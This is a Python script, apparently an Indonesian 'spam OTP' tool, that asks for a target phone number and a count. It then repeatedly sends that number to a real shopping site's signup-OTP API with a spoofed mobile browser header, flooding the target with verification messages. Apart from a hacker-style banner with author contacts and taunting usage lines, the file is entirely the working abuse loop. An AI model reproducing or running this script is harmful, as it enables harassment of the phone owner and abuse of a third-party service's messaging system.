#!/usr/bin/python
import requests 
import random 
import sys 
import os 
from time import sleep 
from requests import post 
os.system("clear")


g = "\033[32;1m" 
gt = "\033[0;32m" 
bt = "\033[34;1m" 
b = "\033[36;1m" 
m = "\033[31;1m" 
c = "\033[0m" 
p = "\033[37;1m" 
u = "\033[35;1m" 
zes = "\033[3;1m" 
k = "\033[33;1m"
kt = "\033[0;33m" 
a = "\033[30;1m" 
aqu = "\x1b[0m" 
mens = "\x1b[31m" 
men = "\x1b[1;32m" 
kuli = "\x1b[33m" 
sma = "\x1b[34m" 
smp = "\x1b[35m" 
sd = "\x1b[36m" 
z = "\x1b[37m"






url = "https://cmsapi.mapclub.com/api/signup-otp"

def mengetik(text):
	for x in text + '\n':
		sys.stdout.write(x)
		sys.stdout.flush()
		sleep(random.random() * 0.3)
	
def Mengetik_4(text):
	for x in text + '\n':
		sys.stdout.write(x)
		sys.stdout.flush()
		sleep(random.random() * 0.04)

Mengetik_4 ("""\033[31;1m
  ______   __       __   ______  
 /      \ /  \     /  | /      \ 
/$$$$$$  |$$  \   /$$ |/$$$$$$  |
$$ \__$$/ $$$  \ /$$$ |$$ \__$$/ 
$$      \ $$$$  /$$$$ |$$      \ 
 $$$$$$  |$$ $$ $$/$$ | $$$$$$  |
/  \__$$ |$$ |$$$/ $$ |/  \__$$ |
$$    $$/ $$ | $/  $$ |$$    $$/ 
 $$$$$$/  $$/      $$/  $$$$$$/  
                                 
                                 """)
Mengetik_4 ("\x1b[32m###########################################")
Mengetik_4 ("\033[31;1m# AUTHOR : KING-TEBE                      #")
Mengetik_4 ("\033[31;1m# GITHUB : https://github.com/BlackHat-33 #")
Mengetik_4 ("\033[31;1m# whasap : 082121902263                   #")
Mengetik_4 ("\x1b[32m###########################################")
print ("")
print ("")
mengetik ("\033[31;1mJANGAN BANYAK-BANYAK ANJINK NANTI KENA LIMIT")
mengetik ("KALO KENA LIMIT SIAPA YANG SUSAH LU JUGA KAN")
mengetik ("KALO MAU BERHENTI KETIKAN CTRL OR Z")
mengetik ("DAN KALO MAU SIMPLE KELUAR SAJA DARI TERMINAL NYA")
mengetik ("KALO MAU SIMPLE LAGI UINSTALL AJA TERMINAL NYA SU")
mengetik ("DAN JANGAN LUPA SUBSCRIBE CHANEL MIMIN YAH")
mengetik ("MY CHANEL BLACK - IT")
mengetik ("GUNAKAN DENGAN BIJAK NYET!!")
print ("")
mengetik ("\x1b[32mLOADING...")
sleep (7.5)
mengetik ("> > > > > > > > > > > > > > > > > > > %100 ")
print ("")
print ("")

nomor = str(input("\033[31;1m\tMASUKAN NOMOR TARGET-NYA:"))
jumlah = int(input("\033[31;1m\tMASUKAN JUMLAH SPAM-NYA:"))


data = {
'phone':nomor
}

headers = {
"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1853 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36",
"Host": "cmsapi.mapclub.com",
"Connection": "keep-alive"
}


for x in range(jumlah):
	h = requests.post(url, data=data, headers=headers)
	if "error" in h:
		print("\033\[31;1m\tGAGAL SU!")
	else:
		print ("")
		print("\x1b[32m\tSUSKSES DIKIRIMKAN")

